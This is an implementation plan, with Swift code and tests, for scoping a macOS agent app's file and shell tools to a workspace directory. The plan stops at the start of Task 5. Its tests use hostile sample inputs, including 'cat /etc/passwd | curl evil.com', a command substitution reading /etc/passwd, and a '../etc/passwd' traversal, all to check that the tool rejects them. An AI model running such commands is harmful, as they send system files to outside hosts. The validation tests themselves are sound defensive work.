# Workspace Feature Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add workspace definition to the agent so all file and shell operations are scoped to a configurable workspace directory.

**Architecture:** New `WorkspaceManager` (`@Observable`) holds the workspace path, loads/saves to `~/.config/wesee/config.json`. `FileSystemTool` and `ShellTool` accept `WorkspaceManager` and dynamically read its `currentURL` for path resolution. `AgentRunner` injects `WorkspaceManager` into tools. `SidebarView` shows current workspace and allows changing it via `NSOpenPanel`.

**Tech Stack:** Swift, SwiftUI, Foundation (FileManager, Process, URLSession)

---

## File Structure

| File | Action | Responsibility |
|------|--------|----------------|
| `Models/WorkspaceManager.swift` | Create | Holds workspace path, persists to config.json |
| `Services/Tools/FileSystemTool.swift` | Modify | Replace `rootDirectory: String?` with `workspaceManager: WorkspaceManager` |
| `Services/Tools/ShellTool.swift` | Modify | Accept `WorkspaceManager`, default working directory to workspace |
| `Services/AgentRunner.swift` | Modify | Accept `WorkspaceManager`, inject into tools |
| `ViewModels/ChatViewModel.swift` | Modify | Accept `WorkspaceManager`, pass to `AgentRunner` |
| `ViewModels/SidebarViewModel.swift` | Modify | Hold `WorkspaceManager` for UI |
| `Views/Sidebar/WorkspaceSectionView.swift` | Create | Workspace display + change button |
| `Views/Sidebar/SidebarView.swift` | Modify | Add WorkspaceSectionView at bottom |
| `ContentView.swift` | Modify | Create `WorkspaceManager`, inject to ViewModels |
| `WeSeeTests/WorkspaceManagerTests.swift` | Create | Tests for WorkspaceManager |
| `WeSeeTests/FileSystemToolTests.swift` | Modify | Use WorkspaceManager instead of rootDirectory |
| `WeSeeTests/ShellToolTests.swift` | Modify | Pass WorkspaceManager |
| `WeSeeTests/AgentRunnerTests.swift` | Modify | Pass WorkspaceManager |
| `WeSeeTests/ChatViewModelTests.swift` | Modify | Pass WorkspaceManager |

---

### Task 1: Create WorkspaceManager

**Files:**
- Create: `client/WeSee/Models/WorkspaceManager.swift`
- Create: `client/WeSeeTests/WorkspaceManagerTests.swift`

- [ ] **Step 1: Write WorkspaceManagerTests.swift**

```swift
import Testing
import Foundation
@testable import WeSee

struct WorkspaceManagerTests {
    @Test func defaultWorkspaceIsDocumentsWeSee() {
        let wm = WorkspaceManager()
        let path = wm.currentURL.path
        #expect(path.hasSuffix("Documents/WeSee"))
    }

    @Test func updateChangesCurrentURL() {
        let wm = WorkspaceManager()
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("test_ws_update").path
        wm.update(path: tmpDir)
        #expect(wm.currentURL.path == tmpDir)
        #expect(FileManager.default.fileExists(atPath: tmpDir))
    }

    @Test func updateCreatesDirectoryIfNeeded() {
        let wm = WorkspaceManager()
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("test_ws_nonexistent_sub/subdir").path
        wm.update(path: tmpDir)
        #expect(FileManager.default.fileExists(atPath: tmpDir))
        // Cleanup
        try? FileManager.default.removeItem(atPath: tmpDir)
    }

    @Test func saveWritesToConfigFile() {
        let wm = WorkspaceManager()
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("test_ws_save").path
        wm.update(path: tmpDir)

        // Verify config was written
        let home = FileManager.default.homeDirectoryForCurrentUser
        let configURL = home.appendingPathComponent(".config/wesee/config.json")
        #expect(FileManager.default.fileExists(atPath: configURL.path))

        guard let data = try? Data(contentsOf: configURL),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            #expect(Bool(false), "config.json should be valid JSON")
            return
        }
        #expect(json["workspace"] as? String == tmpDir)
    }

    @Test func loadReadsExistingWorkspaceFromConfig() {
        // Create a fresh WM with a known path, save it
        let first = WorkspaceManager()
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent("test_ws_load").path
        try? FileManager.default.createDirectory(atPath: tmpDir, withIntermediateDirectories: true)
        first.update(path: tmpDir)

        // Create a second WM — it should load the saved path
        let second = WorkspaceManager()
        #expect(second.currentURL.path == tmpDir)
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test -only-testing:WeSeeTests/WorkspaceManagerTests`
Expected: BUILD FAIL — WorkspaceManager not found

- [ ] **Step 3: Write WorkspaceManager.swift**

```swift
import Foundation

@Observable
final class WorkspaceManager {
    var currentURL: URL

    private let configURL: URL
    private let fileManager: FileManager

    init(fileManager: FileManager = .default) {
        self.fileManager = fileManager
        let home = fileManager.homeDirectoryForCurrentUser
        self.configURL = home.appendingPathComponent(".config/wesee/config.json")
        let defaultURL = home.appendingPathComponent("Documents/WeSee")
        self.currentURL = defaultURL
        load()
        ensureDirectoryExists()
    }

    func update(path: String) {
        let url = URL(fileURLWithPath: path)
        currentURL = url
        ensureDirectoryExists()
        save()
    }

    // MARK: - Persistence

    private func load() {
        guard fileManager.fileExists(atPath: configURL.path),
              let data = try? Data(contentsOf: configURL),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
              let workspacePath = json["workspace"] as? String,
              !workspacePath.isEmpty
        else {
            save()
            return
        }
        let url = URL(fileURLWithPath: workspacePath)
        if !fileManager.fileExists(atPath: url.path) {
            try? fileManager.createDirectory(at: url, withIntermediateDirectories: true)
        }
        currentURL = url
    }

    func save() {
        var json: [String: Any] = [:]
        if let data = try? Data(contentsOf: configURL),
           let existing = try? JSONSerialization.jsonObject(with: data) as? [String: Any] {
            json = existing
        }
        json["workspace"] = currentURL.path

        let dir = configURL.deletingLastPathComponent()
        if !fileManager.fileExists(atPath: dir.path) {
            try? fileManager.createDirectory(at: dir, withIntermediateDirectories: true)
        }
        guard let data = try? JSONSerialization.data(withJSONObject: json, options: .prettyPrinted) else {
            return
        }
        try? data.write(to: configURL)
    }

    private func ensureDirectoryExists() {
        try? fileManager.createDirectory(at: currentURL, withIntermediateDirectories: true)
    }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test -only-testing:WeSeeTests/WorkspaceManagerTests`
Expected: 5 tests PASS

- [ ] **Step 5: Commit**

```bash
git add client/WeSee/Models/WorkspaceManager.swift client/WeSeeTests/WorkspaceManagerTests.swift
git commit -m "feat: add WorkspaceManager for agent workspace configuration"
```

---

### Task 2: Update FileSystemTool to use WorkspaceManager

**Files:**
- Modify: `client/WeSee/Services/Tools/FileSystemTool.swift`
- Modify: `client/WeSeeTests/FileSystemToolTests.swift`

- [ ] **Step 1: Update FileSystemToolTests.swift**

Replace all `FileSystemTool(rootDirectory: tmpDir)` with `FileSystemTool(workspaceManager: wm)` where `wm` is a WorkspaceManager set to `tmpDir`. Replace inline directory usage with relative paths.

```swift
import Testing
import Foundation
@testable import WeSee

struct FileSystemToolTests {
    @Test func readFileReturnsContent() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.path
        let wm = WorkspaceManager()
        wm.update(path: tmpDir)
        let tool = FileSystemTool(workspaceManager: wm)
        try "hello world".write(toFile: tmpDir + "/test_read.txt", atomically: true, encoding: .utf8)
        let result = try await tool.execute(arguments: ["action": "read_file", "path": "test_read.txt"])
        #expect(result == "hello world")
    }

    @Test func readFileNotFoundReturnsError() async throws {
        let wm = WorkspaceManager()
        wm.update(path: FileManager.default.temporaryDirectory.path)
        let tool = FileSystemTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: ["action": "read_file", "path": "nonexistent.txt"])
        #expect(result.hasPrefix("Error: file not found"))
    }

    @Test func writeFileCreatesFile() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.path
        let wm = WorkspaceManager()
        wm.update(path: tmpDir)
        let tool = FileSystemTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: [
            "action": "write_file", "path": "test_write.txt", "content": "test content",
        ])
        #expect(result.hasPrefix("Successfully wrote"))
        let written = try String(contentsOfFile: tmpDir + "/test_write.txt", encoding: .utf8)
        #expect(written == "test content")
    }

    @Test func listDirectoryReturnsContents() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.path
        let wm = WorkspaceManager()
        wm.update(path: tmpDir)
        let tool = FileSystemTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: [
            "action": "list_directory", "path": ".",
        ])
        #expect(!result.isEmpty)
    }

    @Test func listDirectoryNotFoundReturnsError() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.path
        let wm = WorkspaceManager()
        wm.update(path: tmpDir)
        let tool = FileSystemTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: [
            "action": "list_directory", "path": "nonexistent",
        ])
        #expect(result.hasPrefix("Error:"))
    }

    @Test func unknownActionReturnsError() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.path
        let wm = WorkspaceManager()
        wm.update(path: tmpDir)
        let tool = FileSystemTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: ["action": "delete_file", "path": "test.txt"])
        #expect(result.hasPrefix("Error: unknown action"))
    }

    @Test func pathTraversalIsRejected() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.path
        let wm = WorkspaceManager()
        wm.update(path: tmpDir)
        let tool = FileSystemTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: [
            "action": "read_file", "path": "../etc/passwd",
        ])
        #expect(result.hasPrefix("Error: path"))
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test -only-testing:WeSeeTests/FileSystemToolTests`
Expected: BUILD FAIL — FileSystemTool no longer has rootDirectory parameter

- [ ] **Step 3: Update FileSystemTool.swift**

Replace `rootDirectory: String?` parameter with `workspaceManager: WorkspaceManager`:

```swift
import Foundation

final class FileSystemTool: AgentTool {
    let name = "file_system"
    let description = "Read, write, and list files within the workspace directory. Use read_file to read content, write_file to create or overwrite files, and list_directory to list directory contents. All paths are relative to the workspace root."

    let parameters = JSONSchema(
        type: "object",
        properties: [
            "action": JSONSchema.PropertyDef(
                type: "string",
                description: "One of: read_file, write_file, list_directory"
            ),
            "path": JSONSchema.PropertyDef(
                type: "string",
                description: "Path relative to the workspace directory"
            ),
            "content": JSONSchema.PropertyDef(
                type: "string",
                description: "File content to write (required for write_file)"
            ),
        ],
        required: ["action", "path"]
    )

    private let fileManager: FileManager
    private let maxFileSize: Int
    private let workspaceManager: WorkspaceManager

    init(
        fileManager: FileManager = .default,
        maxFileSize: Int = 1_000_000,
        workspaceManager: WorkspaceManager
    ) {
        self.fileManager = fileManager
        self.maxFileSize = maxFileSize
        self.workspaceManager = workspaceManager
    }

    func execute(arguments: [String: Any]) async throws -> String {
        guard let action = arguments["action"] as? String,
              let path = arguments["path"] as? String else {
            return "Error: missing required parameters 'action' or 'path'"
        }
        guard let safePath = resolveSafePath(path) else {
            return "Error: path '\(path)' escapes the workspace directory"
        }
        switch action {
        case "read_file": return try await readFile(at: safePath)
        case "write_file":
            let content = arguments["content"] as? String ?? ""
            return try await writeFile(content: content, at: safePath)
        case "list_directory": return try await listDirectory(at: safePath)
        default: return "Error: unknown action '\(action)'. Supported: read_file, write_file, list_directory"
        }
    }

    private func resolveSafePath(_ relativePath: String) -> String? {
        let root = workspaceManager.currentURL.path
        let resolved = ((root as NSString)
            .appendingPathComponent(relativePath) as NSString)
            .standardizingPath
        let rootStandardized = (root as NSString).standardizingPath
        guard resolved.hasPrefix(rootStandardized) else { return nil }
        return resolved
    }

    private func readFile(at path: String) async throws -> String {
        guard fileManager.fileExists(atPath: path) else {
            return "Error: file not found at \(path)"
        }
        guard let attrs = try? fileManager.attributesOfItem(atPath: path),
              let fileSize = attrs[.size] as? Int,
              fileSize <= maxFileSize else {
            return "Error: file too large or unable to read attributes"
        }
        do {
            return try String(contentsOfFile: path, encoding: .utf8)
        } catch {
            return "Error reading file: \(error.localizedDescription)"
        }
    }

    private func writeFile(content: String, at path: String) async throws -> String {
        let dir = (path as NSString).deletingLastPathComponent
        if !fileManager.fileExists(atPath: dir) {
            try fileManager.createDirectory(atPath: dir, withIntermediateDirectories: true)
        }
        do {
            try content.write(toFile: path, atomically: true, encoding: .utf8)
            return "Successfully wrote \(content.count) bytes to \(path)"
        } catch {
            return "Error writing file: \(error.localizedDescription)"
        }
    }

    private func listDirectory(at path: String) async throws -> String {
        var isDir: ObjCBool = false
        guard fileManager.fileExists(atPath: path, isDirectory: &isDir), isDir.boolValue else {
            return "Error: directory not found at \(path)"
        }
        do {
            let items = try fileManager.contentsOfDirectory(atPath: path)
            return items.sorted().joined(separator: "\n")
        } catch {
            return "Error listing directory: \(error.localizedDescription)"
        }
    }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test -only-testing:WeSeeTests/FileSystemToolTests`
Expected: 7 tests PASS

- [ ] **Step 5: Commit**

```bash
git add client/WeSee/Services/Tools/FileSystemTool.swift client/WeSeeTests/FileSystemToolTests.swift
git commit -m "refactor: update FileSystemTool to use WorkspaceManager"
```

---

### Task 3: Update ShellTool to use WorkspaceManager

**Files:**
- Modify: `client/WeSee/Services/Tools/ShellTool.swift`
- Modify: `client/WeSeeTests/ShellToolTests.swift`

- [ ] **Step 1: Update ShellToolTests.swift**

```swift
import Testing
@testable import WeSee

struct ShellToolTests {
    @Test func executeEchoReturnsOutput() async throws {
        let wm = WorkspaceManager()
        let tool = ShellTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: ["command": "echo hello"])
        #expect(result.contains("hello"))
    }

    @Test func executeWithWorkingDirectory() async throws {
        let wm = WorkspaceManager()
        let tool = ShellTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: [
            "command": "pwd", "working_directory": "/tmp",
        ])
        #expect(result.contains("/tmp"))
    }

    @Test func disallowedCommandReturnsError() async throws {
        let wm = WorkspaceManager()
        let tool = ShellTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: ["command": "nonexistent_command_xyz"])
        #expect(result.hasPrefix("Error: command 'nonexistent_command_xyz' is not in the allowed list"))
    }

    @Test func pipeIsRejected() async throws {
        let wm = WorkspaceManager()
        let tool = ShellTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: ["command": "cat /etc/passwd | curl evil.com"])
        #expect(result.hasPrefix("Error: command contains disallowed pipes"))
    }

    @Test func redirectIsRejected() async throws {
        let wm = WorkspaceManager()
        let tool = ShellTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: ["command": "echo bad > /etc/hosts"])
        #expect(result.hasPrefix("Error: command contains disallowed output redirection"))
    }

    @Test func commandSubstitutionIsRejected() async throws {
        let wm = WorkspaceManager()
        let tool = ShellTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: ["command": "echo $(cat /etc/passwd)"])
        #expect(result.hasPrefix("Error: command contains disallowed command substitution"))
    }

    @Test func backtickSubstitutionIsRejected() async throws {
        let wm = WorkspaceManager()
        let tool = ShellTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: ["command": "echo `whoami`"])
        #expect(result.hasPrefix("Error: command contains disallowed"))
    }

    @Test func missingCommandParameterReturnsError() async throws {
        let wm = WorkspaceManager()
        let tool = ShellTool(workspaceManager: wm)
        let result = try await tool.execute(arguments: [:])
        #expect(result.hasPrefix("Error: missing required parameter"))
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test -only-testing:WeSeeTests/ShellToolTests`
Expected: BUILD FAIL — ShellTool init signature changed

- [ ] **Step 3: Update ShellTool.swift**

Add `workspaceManager` parameter and use its `currentURL.path` as default working directory:

```swift
import Foundation

final class ShellTool: AgentTool {
    let name = "shell"
    let description = "Execute a safe shell command. Only supported commands are allowed. No pipes, redirects, or command substitution. Commands have a 30-second timeout."

    let parameters = JSONSchema(
        type: "object",
        properties: [
            "command": JSONSchema.PropertyDef(
                type: "string",
                description: "The shell command to execute"
            ),
            "working_directory": JSONSchema.PropertyDef(
                type: "string",
                description: "Optional working directory for the command"
            ),
        ],
        required: ["command"]
    )

    private let timeoutSeconds: Int
    private let allowedCommands: Set<String>
    private let workspaceManager: WorkspaceManager

    private static let defaultAllowedCommands: Set<String> = [
        "ls", "cat", "head", "tail", "wc", "grep", "find", "echo",
        "pwd", "date", "whoami", "uname", "df", "du", "ps", "top",
        "git", "swift", "xcodebuild", "python3", "node", "npm",
        "sed", "awk", "sort", "uniq", "diff", "xargs", "mkdir",
        "touch", "cp", "mv", "rm", "chmod", "ln", "file", "which",
        "open", "osascript", "plutil", "defaults", "system_profiler",
    ]

    init(
        timeoutSeconds: Int = 30,
        allowedCommands: Set<String>? = nil,
        workspaceManager: WorkspaceManager
    ) {
        self.timeoutSeconds = timeoutSeconds
        self.allowedCommands = allowedCommands ?? Self.defaultAllowedCommands
        self.workspaceManager = workspaceManager
    }

    func execute(arguments: [String: Any]) async throws -> String {
        guard let command = arguments["command"] as? String else {
            return "Error: missing required parameter 'command'"
        }
        if let error = validateCommand(command) {
            return error
        }
        let workingDir = arguments["working_directory"] as? String
            ?? workspaceManager.currentURL.path
        return try await runCommand(command, workingDirectory: workingDir)
    }

    private func validateCommand(_ command: String) -> String? {
        let trimmed = command.trimmingCharacters(in: .whitespaces)
        guard !trimmed.isEmpty else {
            return "Error: empty command"
        }
        let dangerousPatterns = [
            ("|", "|", "pipes"),
            (";", ";", "command separators"),
            ("&", "&", "background/chain operators"),
            ("`", "`", "backtick command substitution"),
            ("$(", "$(", "command substitution"),
            (">", ">", "output redirection"),
            ("<", "<", "input redirection"),
        ]
        for (pattern, _, name) in dangerousPatterns {
            if trimmed.contains(pattern) {
                return "Error: command contains disallowed \(name) ('\(pattern)')"
            }
        }
        let firstWord = trimmed.components(separatedBy: .whitespaces).first ?? ""
        let commandName = (firstWord as NSString).lastPathComponent
        guard allowedCommands.contains(commandName) else {
            return "Error: command '\(commandName)' is not in the allowed list"
        }
        return nil
    }

    private func runCommand(_ command: String, workingDirectory: String?) async throws -> String {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/zsh")
        process.arguments = ["-c", command]
        process.environment = [
            "PATH": "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin",
            "HOME": NSHomeDirectory(),
        ]

        if let dir = workingDirectory {
            process.currentDirectoryURL = URL(fileURLWithPath: dir)
        } else {
            process.currentDirectoryURL = URL(fileURLWithPath: workspaceManager.currentURL.path)
        }

        let stdoutPipe = Pipe()
        let stderrPipe = Pipe()
        process.standardOutput = stdoutPipe
        process.standardError = stderrPipe

        return try await withCheckedThrowingContinuation { continuation in
            let stdoutData = NSMutableData()
            let stderrData = NSMutableData()

            stdoutPipe.fileHandleForReading.readabilityHandler = { handle in
                stdoutData.append(handle.availableData)
            }
            stderrPipe.fileHandleForReading.readabilityHandler = { handle in
                stderrData.append(handle.availableData)
            }

            process.terminationHandler = { proc in
                stdoutPipe.fileHandleForReading.readabilityHandler = nil
                stderrPipe.fileHandleForReading.readabilityHandler = nil

                let out = String(data: stdoutData as Data, encoding: .utf8) ?? ""
                let err = String(data: stderrData as Data, encoding: .utf8) ?? ""
                var result = ""
                if !out.isEmpty { result += out }
                if !err.isEmpty { result += (result.isEmpty ? "" : "\n") + err }
                if result.isEmpty { result = "(no output)" }
                if proc.terminationStatus != 0 {
                    result = "Exit code \(proc.terminationStatus)\n" + result
                }
                continuation.resume(returning: result)
            }

            do {
                try process.run()
            } catch {
                continuation.resume(
                    returning: "Error: failed to start command: \(error.localizedDescription)"
                )
                return
            }

            DispatchQueue.global().asyncAfter(deadline: .now() + .seconds(self.timeoutSeconds)) {
                if process.isRunning {
                    process.terminate()
                }
            }
        }
    }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test -only-testing:WeSeeTests/ShellToolTests`
Expected: 8 tests PASS

- [ ] **Step 5: Commit**

```bash
git add client/WeSee/Services/Tools/ShellTool.swift client/WeSeeTests/ShellToolTests.swift
git commit -m "refactor: update ShellTool to use WorkspaceManager for default working directory"
```

---

### Task 4: Update AgentRunner to inject WorkspaceManager

**Files:**
- Modify: `client/WeSee/Services/AgentRunner.swift`
- Modify: `client/WeSeeTests/AgentRunnerTests.swift`

- [ ] **Step 1: Update AgentRunnerTests.swift**

Add `WorkspaceManager` to `AgentRunner` init calls:

```swift
import Testing
import Foundation
@testable import WeSee

final class MockDeepSeekService: DeepSeekService {
    var events: [LLMStreamEvent] = []

    override func streamChat(
        messages: [[String: Any]],
        config: ClientConfig,
        tools: [[String: Any]] = [],
        systemPrompt: String? = nil
    ) -> AsyncThrowingStream<LLMStreamEvent, Error> {
        let currentEvents = self.events
        self.events = []
        return AsyncThrowingStream { continuation in
            for event in currentEvents {
                continuation.yield(event)
            }
            continuation.finish()
        }
    }
}

struct FakeEchoTool: AgentTool {
    let name = "echo"
    let description = "Echoes input"
    let parameters = JSONSchema(
        type: "object",
        properties: ["text": JSONSchema.PropertyDef(type: "string", description: "Text to echo")],
        required: ["text"]
    )
    func execute(arguments: [String: Any]) async throws -> String {
        let text = arguments["text"] as? String ?? ""
        return "echo: \(text)"
    }
}

struct AgentRunnerTests {
    @Test func singleRoundNoToolCallsEmitsTokensAndDone() async throws {
        let registry = ToolRegistry()
        let mockService = MockDeepSeekService()
        mockService.events = [
            .token("Hello"),
            .token(" world"),
            .finishReason("stop"),
        ]
        let wm = WorkspaceManager()
        let runner = AgentRunner(
            deepSeekService: mockService,
            toolRegistry: registry,
            maxRounds: 10,
            workspaceManager: wm
        )
        let history = [Message(content: "hi", isFromMe: true)]

        var tokens = ""
        var doneReceived = false

        for try await event in runner.run(history: history, config: .default) {
            switch event {
            case .token(let t): tokens += t
            case .done: doneReceived = true
            default: break
            }
        }

        #expect(tokens == "Hello world")
        #expect(doneReceived)
    }

    @Test func toolCallLoopExecutesAndContinues() async throws {
        let registry = ToolRegistry()
        registry.register(FakeEchoTool())

        let mockService = MockDeepSeekService()
        mockService.events = [
            .toolCallDelta(ToolCallDelta(index: 0, id: "call_1", name: "echo", arguments: #"{"text":"test"}"#)),
            .finishReason("tool_calls"),
        ]

        let wm = WorkspaceManager()
        let runner = AgentRunner(
            deepSeekService: mockService,
            toolRegistry: registry,
            maxRounds: 10,
            workspaceManager: wm
        )
        let history = [Message(content: "echo test", isFromMe: true)]

        var toolStarts: [(String, String)] = []
        var toolResults: [(String, String)] = []

        for try await event in runner.run(history: history, config: .default) {
            switch event {
            case .toolCallStart(let id, let name, _):
                toolStarts.append((id, name))
            case .toolCallResult(let id, let name, let result):
                toolResults.append((id, name))
                #expect(result == "echo: test")
            case .error(let msg):
                #expect(msg == "Max rounds reached")
            default: break
            }
        }

        #expect(toolStarts.count == 1)
        #expect(toolResults.count == 1)
        #expect(toolStarts[0].0 == "call_1")
        #expect(toolStarts[0].1 == "echo")
    }

    @Test func unknownToolReturnsErrorResult() async throws {
        let registry = ToolRegistry()

        let mockService = MockDeepSeekService()
        mockService.events = [
            .toolCallDelta(ToolCallDelta(
                index: 0, id: "call_1", name: "unknown_tool",
                arguments: #"{"key":"val"}"#
            )),
            .finishReason("tool_calls"),
        ]

        let wm = WorkspaceManager()
        let runner = AgentRunner(
            deepSeekService: mockService,
            toolRegistry: registry,
            maxRounds: 10,
            workspaceManager: wm
        )
        let history = [Message(content: "use tool", isFromMe: true)]

        var toolResult = ""
        for try await event in runner.run(history: history, config: .default) {
            if case .toolCallResult(_, _, let result) = event {
                toolResult = result
            }
        }

        #expect(toolResult.hasPrefix("Error: unknown tool"))
    }

    @Test func parseJSONArgsParsesValidJSON() {
        let result = AgentRunner.parseJSONArgs(#"{"key": "value", "num": 42}"#)
        #expect(result?["key"] as? String == "value")
        #expect(result?["num"] as? Int == 42)
    }

    @Test func parseJSONArgsReturnsNilForInvalidJSON() {
        let result = AgentRunner.parseJSONArgs("not json")
        #expect(result == nil)
    }

    @Test func encodeJSONArgsProducesJSONString() {
        let result = AgentRunner.encodeJSONArgs(["key": "value"])
        #expect(result.contains("\"key\""))
        #expect(result.contains("\"value\""))
    }
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test -only-testing:WeSeeTests/AgentRunnerTests`
Expected: BUILD FAIL — AgentRunner init missing workspaceManager parameter

- [ ] **Step 3: Update AgentRunner.swift**

Add `workspaceManager` parameter and inject into `registerDefaultTools()`:

```swift
import Foundation

final class AgentRunner {
    private let deepSeekService: DeepSeekService
    private let toolRegistry: ToolRegistry
    private let maxRounds: Int
    private let workspaceManager: WorkspaceManager

    init(
        deepSeekService: DeepSeekService = DeepSeekService(),
        toolRegistry: ToolRegistry = ToolRegistry(),
        maxRounds: Int = 10,
        workspaceManager: WorkspaceManager
    ) {
        self.deepSeekService = deepSeekService
        self.toolRegistry = toolRegistry
        self.maxRounds = maxRounds
        self.workspaceManager = workspaceManager
        registerDefaultTools()
    }

    private func registerDefaultTools() {
        toolRegistry.register(ShellTool(workspaceManager: workspaceManager))
        toolRegistry.register(FileSystemTool(workspaceManager: workspaceManager))
        WeSeeLog.info("AgentRunner registered \(toolRegistry.allTools.count) tools")
    }

    func run(
        history: [Message],
        config: ClientConfig,
        systemPrompt: String? = nil
    ) -> AsyncThrowingStream<AgentEvent, Error> {
        AsyncThrowingStream { continuation in
            Task {
                var messages: [[String: Any]] = history.map { msg in
                    ["role": msg.isFromMe ? "user" : "assistant", "content": msg.content]
                }
                let tools = self.toolRegistry.encodeToAPIParams()
                var round = 0

                WeSeeLog.info("AgentRunner start: rounds=\(self.maxRounds) messages=\(messages.count) tools=\(tools.count)")

                while round < self.maxRounds {
                    round += 1
                    WeSeeLog.info("AgentRunner round \(round)/\(self.maxRounds) start")
                    var toolCallAggregator: [Int: (id: String, name: String, arguments: String)] = [:]
                    var hasToolCalls = false
                    var tokenCount = 0

                    do {
                        let stream = self.deepSeekService.streamChat(
                            messages: messages,
                            config: config,
                            tools: tools,
                            systemPrompt: systemPrompt
                        )

                        for try await event in stream {
                            switch event {
                            case .token(let text):
                                tokenCount += 1
                                continuation.yield(.token(text))

                            case .thinking(let text):
                                continuation.yield(.thinking(text))

                            case .toolCallDelta(let delta):
                                hasToolCalls = true
                                var current = toolCallAggregator[delta.index]
                                    ?? ("", "", "")
                                if let id = delta.id { current.id = id }
                                if let name = delta.name { current.name = name }
                                current.arguments += delta.arguments
                                toolCallAggregator[delta.index] = current

                            case .finishReason(let reason):
                                WeSeeLog.debug("AgentRunner finish reason: \(reason ?? "nil")")
                            }
                        }
                        WeSeeLog.info("AgentRunner stream ended: round=\(round) tokens=\(tokenCount) hasToolCalls=\(hasToolCalls)")
                    } catch {
                        WeSeeLog.error("AgentRunner stream error: \(error.localizedDescription)")
                        continuation.yield(.error(error.localizedDescription))
                        continuation.finish()
                        return
                    }

                    if !hasToolCalls {
                        WeSeeLog.info("AgentRunner done: no tool calls, finishing")
                        continuation.yield(.done)
                        continuation.finish()
                        return
                    }

                    // Execute tools
                    let sortedKeys = toolCallAggregator.keys.sorted()
                    var toolCallDicts: [[String: Any]] = []
                    var toolResultMessages: [[String: Any]] = []

                    for key in sortedKeys {
                        guard let tc = toolCallAggregator[key],
                              !tc.id.isEmpty,
                              !tc.name.isEmpty else { continue }

                        let argsDict = Self.parseJSONArgs(tc.arguments) ?? [:]
                        WeSeeLog.info("AgentRunner executing tool: name=\(tc.name) args=\(argsDict)")

                        continuation.yield(
                            .toolCallStart(id: tc.id, name: tc.name, arguments: argsDict)
                        )

                        let result: String
                        if let tool = self.toolRegistry.get(name: tc.name) {
                            do {
                                result = try await tool.execute(arguments: argsDict)
                                WeSeeLog.info("AgentRunner tool result: name=\(tc.name) resultLen=\(result.count)")
                            } catch {
                                result = "Tool execution error: \(error.localizedDescription)"
                                WeSeeLog.error("AgentRunner tool error: name=\(tc.name) error=\(error.localizedDescription)")
                            }
                        } else {
                            result = "Error: unknown tool '\(tc.name)'"
                            WeSeeLog.error("AgentRunner unknown tool: \(tc.name)")
                        }

                        continuation.yield(
                            .toolCallResult(id: tc.id, name: tc.name, result: result)
                        )

                        let argsJSON = Self.encodeJSONArgs(argsDict)
                        toolCallDicts.append([
                            "id": tc.id,
                            "type": "function",
                            "function": [
                                "name": tc.name,
                                "arguments": argsJSON,
                            ],
                        ])

                        toolResultMessages.append([
                            "role": "tool",
                            "tool_call_id": tc.id,
                            "content": result,
                        ])
                    }

                    // Assistant tool_calls message MUST come before tool result messages
                    messages.append([
                        "role": "assistant",
                        "content": NSNull(),
                        "tool_calls": toolCallDicts,
                    ])
                    messages.append(contentsOf: toolResultMessages)

                    WeSeeLog.info("AgentRunner round \(round) complete, looping back")
                }

                WeSeeLog.error("AgentRunner max rounds reached: \(self.maxRounds)")
                continuation.yield(.error("Max rounds reached"))
                continuation.finish()
            }
        }
    }

    static func parseJSONArgs(_ jsonStr: String) -> [String: Any]? {
        guard let data = jsonStr.data(using: .utf8),
              let obj = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
        else { return nil }
        return obj
    }

    static func encodeJSONArgs(_ args: [String: Any]) -> String {
        guard let data = try? JSONSerialization.data(withJSONObject: args),
              let str = String(data: data, encoding: .utf8)
        else { return "{}" }
        return str
    }
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `xcodebuild -project WeSee.xcodeproj -scheme WeSee -configuration Debug test -only-testing:WeSeeTests/AgentRunnerTests`
Expected: 6 tests PASS

- [ ] **Step 5: Commit**

```bash
git add client/WeSee/Services/AgentRunner.swift client/WeSeeTests/AgentRunnerTests.swift
git commit -m "refactor: inject WorkspaceManager into AgentRunner and tools"
```

---

### Task 5: Update ViewModels to pass WorkspaceManager

**Files:**
